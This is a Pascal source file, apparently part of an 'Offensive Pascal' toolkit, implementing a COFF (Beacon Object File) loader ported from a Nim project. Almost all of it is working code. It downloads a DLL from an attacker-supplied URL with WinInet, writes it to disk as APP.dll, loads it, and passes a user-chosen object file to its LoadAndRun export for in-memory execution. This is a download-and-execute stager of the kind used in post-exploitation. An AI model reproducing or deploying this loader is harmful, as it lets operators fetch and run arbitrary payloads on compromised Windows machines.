{

  ^^^^^^^
  SIMPLE COFF LOADER IN PASCAL
  ^^^^^^^


 Author : Lawrence @zux0x3a  - Part of Offensive Pascal Lang

 https://0xsp.com



 Ported from : https://github.com/zimnyaa/nim-lazy-bof/tree/main

 Huge thanks to : https://github.com/sliverarmory/COFFLoader/ for the DLL release.



}



program project1;

//{$mode objfpc}{$H+}
 {$mode Delphi}

uses
  dynlibs,
  sysutils,
  classes,
  windows,
  winInet,
  ctypes;

type
  WCHAR = WideChar;
  LPVOID = Pointer;
  cstring = PChar;

const
  MAX_PATH = 260;
  MEM_COMMIT = $1000;
  PAGE_READWRITE = $04;



var
  entrypoint_arg: array[0..10] of byte =
    ($FF, $FF, $FF, $FF, $03, $00, $00, $00, $67, $6F, $00); // len(c"go"), c"go"
  coff_arg: array[0..3] of byte = ($00, $00, $00, $00);

 Coff_file : Tfilestream;

type
  TCallback = function(data: PChar; status: Integer): Integer; cdecl;

//function loadcoff(data: Pointer; length: Integer; callback: TCallback): Integer; cdecl; external coffloader name 'LoadAndRun';

type
  TLoadCoffFunc = function(data: Pointer; length: Integer; callback: TCallback): Integer; stdcall;

var

loadcoff : TloadCoffFunc;


// convert the widestring to string .


function lpwstrc(bytes: array of WCHAR): string;
var
  i: integer;
begin
  SetLength(Result, Length(bytes));
  for i := 0 to Length(bytes) - 1 do
    Result[i+1] := Char(bytes[i]);
end;

function callback(data: cstring; status: integer): integer; cdecl;
begin
  WriteLn('[!] CALLBACK CALLED');
  WriteLn(data);
  Result := 0;
end;



function GetWebPage(const Url: string): string;
var
  NetHandle: HINTERNET;
  UrlHandle: HINTERNET;
  Buffer: array[0..1023] of Byte;
  BytesRead: dWord;
  StrBuffer: String;
begin
  Result := '';
  BytesRead := Default(dWord);
  NetHandle := InternetOpen('Mozilla/5.0(compatible; WinInet)', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

  // NetHandle valid?
  if Assigned(NetHandle) then
    Try
      UrlHandle := InternetOpenUrl(NetHandle, Pchar(Url), nil, 0, INTERNET_FLAG_RELOAD, 0);

      // UrlHandle valid?
      if Assigned(UrlHandle) then
        Try
          repeat
            InternetReadFile(UrlHandle, @Buffer, SizeOf(Buffer), BytesRead);
            SetString(StrBuffer, PAnsiChar(@Buffer[0]), BytesRead);
            Result := Result +strBuffer;
          until BytesRead = 0;
        Finally
          InternetCloseHandle(UrlHandle);
        end
      // o/w UrlHandle invalid
      else
        writeln('Cannot open URL: ' + Url);
    Finally
      InternetCloseHandle(NetHandle);
    end
  // NetHandle invalid
  else
    raise Exception.Create('Unable to initialize WinInet');
end;



// main procedure to load COFF files you can refer to the following repo :


procedure Main;
var

  loader_args: LPVOID;
  coffsize: integer;
  i : integer;
  file_name : string;
  l_Handle,MD: Tlibhandle;
  lName,R_URL : string;
  AMemStr : TMemoryStream;
  isokay : boolean;


begin

  isokay := false;
  for i := 0 to paramcount do begin
    if (paramstr(i)='-o') then
    begin
    file_name := paramstr(i+1);
    end;

    if (paramStr(i) ='-u') then begin
    R_URL := paramstr(i+1);
    end;
  end;

  if not FileExists(getcurrentdir+'\APP.dll') then begin
  lName := Getwebpage(R_URL);
  isokay := true;

  end;




  AMemStr := TStringStream.Create;
  AmemStr.Write(lName[1],length(lName) * sizeof(lName[1]));

  if isokay then begin
  AMemStr.SaveToFile(getcurrentdir+'\APP.dll');
  end;

  sleep(1000);


  l_handle := LoadLibrary('APP.dll');
  loadcoff := TloadCoffFunc(GetProcAddress(l_handle,'LoadAndRun'));



  try
  coff_file := TFileStream.Create(file_name, fmOpenRead or fmShareDenyWrite);
  try

    WriteLn('[+] Starting with ', GetLastError());
    WriteLn('[+] Load coff address -> ', PtrUInt(@loadcoff));

    WriteLn('[+] callback function address -> ', PtrUInt(@callback));
    loader_args := VirtualAlloc(nil, 4 + coff_file.Size + Length(entrypoint_arg) + Length(coff_arg), MEM_COMMIT, PAGE_READWRITE);

    WriteLn('[!] VirtualAlloc Address ', GetLastError(), ' to ', PtrUInt(loader_args));


    // "go" entrypoint
    Move(entrypoint_arg[0], loader_args^, Length(entrypoint_arg));

    // file size
    coffsize := coff_file.Size;
    Move(coffsize, (loader_args + Length(entrypoint_arg))^, 4);

    // file bytes
    coff_file.Position := 0;
    coff_file.ReadBuffer((loader_args + Length(entrypoint_arg) + 4)^, coff_file.Size);

    // args
    Move(coff_arg[0], (loader_args + Length(entrypoint_arg) + coff_file.Size + 4)^, Length(coff_arg));

    WriteLn('[!] memory copied');
    WriteLn('[!] args will be: (', PtrUInt(loader_args), ',', PtrUInt(coff_file.Size+Length(entrypoint_arg)+Length(coff_arg)+4), ',', PtrUInt(@callback), ')');


    // Loading the COFF object file

    loadcoff(loader_args, coff_file.Size+Length(entrypoint_arg)+Length(coff_arg)+4, @callback);


     finally
     coff_file.Free;

        end;
        except
      on E: exception do
       writeln('[!] choose a vaild file to proceed');
      end;

  end;


begin

  // Program execution

  Main;


end.

